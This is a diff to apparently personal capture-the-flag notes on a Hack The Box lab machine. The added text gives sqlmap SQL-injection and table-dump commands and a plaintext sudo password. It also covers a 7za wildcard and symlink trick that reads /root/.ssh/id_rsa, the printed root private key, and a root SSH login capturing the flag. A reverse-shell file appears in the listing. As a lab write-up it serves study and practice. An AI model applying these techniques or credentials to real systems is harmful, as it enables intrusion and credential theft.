@@ -19,9 +19,19 @@ then inject some other statmenet afterwards to see whats on the database.
 
 inject with a union? i think u might be able to because you get an output message if the email is valid on their database
 
+forgot we have sqlmap so here
+
+sqlmap -r request.txt --level=5 --risk=3 --dbs -p email --batch
+
+and then after database enumeration i got the tables with this
+
+sqlmap -r request.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D usage_blog --tables
+
+thennn 
+
+sqlmap -r request.txt -p email --batch --level 5 --risk 3 --dbms=mysql -D admin_users -T admin_users --dump
+
 [01:28:29] [INFO] POST parameter 'email' appears to be 'MySQL < 5.0.12 AND time-based blind (BENCHMARK)' injectable
-
-
 
 AFTER A LOT OF SQLMAPPING TO FIND THE RIGHT DB TABLE AND COLUMN
 
@@ -52,5 +62,124 @@ anddd theres a buncha dependencies listed and onee has arbitrary code execute th
 
 reminder to self to read what the code is for that and why it works again its in kali webshells
 
+was able to log in as xander user with sudo password which was in the .monitrc file
+
+pass: 3nc0d3d_pa$$w0rd
+
+/var/www/html
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+Error changing working directory to /var/www/html
+/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
+Password has been reset.
+
+the program tries to backup the html from /var/www but fails. 
+
+i can try rerouting the path for 7za to read. 
+
+by creating a file called @files.txt (can be replaced with any other name it doesnt matter), then creating another file called files.txt, and finally symlinking a sudo priviledge file to the files.txt, the 7za will attempt to read the files.txt as a list of files to compress. when the 7za errors because the files.txt is in fact not a list of files to compress, it will error with the catted output of the file.
 
 
+from the nmap scan i know that the ssh port is open and i could try getting the ssh private key from /root/.ssh/id_rsa
+
+
+ln -s /root/.ssh/id_rsa files.txt
+
+-----BEGIN OPENSSH PRIVATE KEY----- : No more files
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files
+QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files
+QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q : No more files
+AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs : No more files
+H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= : No more files
+-----END OPENSSH PRIVATE KEY----- : No more files
+
+
+putting this in a file on my computer
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8MiQgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDsH2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM=
+-----END OPENSSH PRIVATE KEY-----
+
+
+
+
+
+┌──(nixiuff㉿kali)-[~/hacking_lab/HTB/yoyo/usage]
+└─$ ssh -i ssh_private_key root@10.10.11.18
+The authenticity of host '10.10.11.18 (10.10.11.18)' can't be established.
+ED25519 key fingerprint is SHA256:4YfMBkXQJGnXxsf0IOhuOJ1kZ5c1fOLmoOGI70R/mws.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.18' (ED25519) to the list of known hosts.
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'ssh_private_key' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "ssh_private_key": bad permissions
+root@10.10.11.18's password: 
+
+                                                                             
+┌──(nixiuff㉿kali)-[~/hacking_lab/HTB/yoyo/usage]
+└─$ ls -la                                 
+total 96
+drwxr-xr-x 2 nixiuff nixiuff  4096 May 10 13:49 .
+drwxr-xr-x 5 nixiuff nixiuff  4096 May  8 21:36 ..
+-rw-r--r-- 1 nixiuff nixiuff 12288 May 10 13:50 .ssh_private_key.swp
+-rw-r--r-- 1 nixiuff nixiuff 14667 May  9 00:07 Screenshot_2024-05-09_00-07-21.png
+-rw-r--r-- 1 nixiuff nixiuff    61 May  9 18:18 admin_hash
+-rw-r--r-- 1 nixiuff nixiuff  6426 May  8 23:19 ffufscan_dir
+-rw-r--r-- 1 nixiuff nixiuff   853 May  8 21:38 nmapscan
+-rw-r--r-- 1 nixiuff nixiuff  4332 May 10 13:49 notes
+-rwxr-xr-x 1 nixiuff nixiuff  5493 May 10 00:00 php-reverse-shell.jpg
+-rwxr-xr-x 1 nixiuff nixiuff  5493 May  9 23:49 php-reverse-shell.png
+-rw-r--r-- 1 nixiuff nixiuff    61 May  9 20:05 raj
+-rw-r--r-- 1 nixiuff nixiuff    61 May  9 20:30 raj2
+-rw-r--r-- 1 nixiuff nixiuff  1258 May  9 18:30 request.txt
+-rw-r--r-- 1 nixiuff nixiuff   395 May 10 13:49 ssh_private_key
+-rw-r--r-- 1 nixiuff nixiuff    33 May 10 11:21 user.txt
+                                                                             
+┌──(nixiuff㉿kali)-[~/hacking_lab/HTB/yoyo/usage]
+└─$ chmod 600 ssh_private_key                        
+                                                                             
+┌──(nixiuff㉿kali)-[~/hacking_lab/HTB/yoyo/usage]
+└─$ ssh -i ssh_private_key root@10.10.11.18
+Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+  System information as of Fri May 10 05:53:37 PM UTC 2024
+
+  System load:           0.009765625
+  Usage of /:            64.9% of 6.53GB
+  Memory usage:          20%
+  Swap usage:            0%
+  Processes:             222
+  Users logged in:       0
+  IPv4 address for eth0: 10.10.11.18
+  IPv6 address for eth0: dead:beef::250:56ff:feb9:5655
+
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Mon Apr  8 13:17:47 2024 from 10.10.14.40
+root@usage:~# ls
+cleanup.sh  root.txt  snap  usage_management.c
+root@usage:~# cat root.txt
+508f3414fd5eb3ddec3b5d36c220302c
+root@usage:~# ^C
+root@usage:~# 
+
+
+WOOOOOOOOOOOOOOOOOOOOOo
